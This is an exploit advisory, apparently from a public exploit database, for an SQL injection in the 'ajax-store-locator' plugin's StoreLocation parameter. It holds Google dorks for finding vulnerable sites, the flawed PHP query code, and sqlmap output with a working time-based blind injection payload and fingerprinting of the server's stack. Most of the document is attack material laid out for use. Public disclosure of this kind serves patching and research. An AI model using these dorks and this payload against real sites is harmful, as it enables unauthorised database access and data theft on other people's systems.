

# Exploit Author : Claudio Viviani


# Software Link : Premium

# Dork Google: inurl:ajax-store-locator
#              index of ajax-store-locator      

# Date : 2015-03-29

# Tested on : Windows 7 / Mozilla Firefox
#             Linux / Mozilla Firefox

######################

# Info:

 The "sl_dal_searchlocation_cbf" ajax function is affected from SQL Injection vulnerability
 
 "StoreLocation" var is not sanitized

# PoC Exploit:

 
 StoreLocation&#039;s value must contain "~" delimiter
 
 $storeLoc = $_REQUEST["StoreLocation"];
 ...
 ...
 $qryVal = explode("~", $storeLoc);
 $sql_query = "SELECT a.*,b.*, 0 as ......... LEFT JOIN `$sl_tb_pluginset` as b ON (1=1)  WHERE a.id=$qryVal[1]"

# PoC sqlmap:


 [18:24:11] [INFO] GET parameter &#039;StoreLocation&#039; seems to be &#039;MySQL >= 5.0.12 AND time-based blind (SELECT)&#039; injectable 
 for the remaining tests, do you want to include all tests for &#039;MySQL&#039; extending provided level (1) and risk (1) values? [Y/n] 
 [18:24:18] [INFO] testing &#039;Generic UNION query (NULL) - 1 to 20 columns&#039;
 [18:24:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
 [18:24:24] [INFO] testing &#039;MySQL UNION query (NULL) - 1 to 20 columns&#039;
 [18:24:29] [INFO] checking if the injection point on GET parameter &#039;StoreLocation&#039; is a false positive
 GET parameter &#039;StoreLocation&#039; is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
 sqlmap identified the following injection points with a total of 89 HTTP(s) requests:
 ---
 Parameter: StoreLocation (GET)
     Type: AND/OR time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
     Payload: action=sl_dal_searchlocation&funMethod=SearchStore&Location=Social&StoreLocation=1~1 AND (SELECT * FROM (SELECT(SLEEP(5)))LCKZ)
 ---
 [18:29:48] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux CentOS 5.10
 web application technology: PHP 5.3.3, Apache 2.2.3
 back-end DBMS: MySQL 5.0.12

